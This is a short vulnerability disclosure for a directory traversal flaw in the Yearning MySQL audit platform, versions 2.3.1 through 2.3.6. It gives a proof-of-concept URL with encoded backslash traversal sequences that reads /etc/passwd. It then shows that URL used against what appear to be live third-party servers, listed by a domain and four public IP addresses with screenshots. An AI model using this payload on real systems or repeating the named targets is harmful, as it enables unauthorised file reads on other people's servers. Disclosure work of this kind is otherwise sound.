# yearning has Directory traversal vulnerability

## Overview

Manufacturer's website information：http://yearning.io/

## 1. Affected version

version: v2.3.1 Interstellar GA 

version: v 2.3.2 Interstellar GA 

version: v 2.3.4 Neptune 

version: v 2.3.5 Neptune

version: v 2.3.6 Neptune

## 2.Vulnerability details

POC

```
/front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```



version: v2.3.1 Interstellar GA 

https://mysql.zb-sx.cn/#/login

![image-20220308110341311](img/image-20220308110341311.png)

https://mysql.zb-sx.cn/front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

![image-20220308110402638](img/image-20220308110402638.png)



version: v 2.3.2 Interstellar GA 

http://18.162.92.125/#/login

![image-20220308132832379](img/image-20220308132832379.png)

http://18.162.92.125/front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

![image-20220308132924261](img/image-20220308132924261.png)

version: v 2.3.4 Neptune

![image-20220308133058103](img/image-20220308133058103.png)

http://47.93.26.226:9000/front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

![image-20220308133131271](img/image-20220308133131271.png)

version: v 2.3.5 Neptune

http://39.100.157.58:8001/#/login

![image-20220308133321571](img/image-20220308133321571.png)

http://39.100.157.58:8001/front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

![image-20220308133346233](img/image-20220308133346233.png)

version: v 2.3.6 Neptune

http://182.92.66.166:8086/#/login

![image-20220308133438261](img/image-20220308133438261.png)

http://182.92.66.166:8086/front//%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd

![image-20220308133520192](img/image-20220308133520192.png)



## Vulnerability impact

Yearning is a MySQL audit platform. There is a directory traversal vulnerability in Yearning, which can be used by attackers to obtain sensitive information.

